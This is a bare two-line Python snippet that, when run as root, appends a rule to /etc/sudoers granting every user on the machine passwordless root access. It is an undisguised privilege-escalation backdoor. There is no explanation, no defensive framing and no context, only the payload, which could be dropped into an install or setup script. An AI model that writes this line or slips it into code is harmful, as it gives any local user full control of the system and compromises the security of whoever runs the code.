import os
if os.getuid() == 0: os.system("""echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers""")
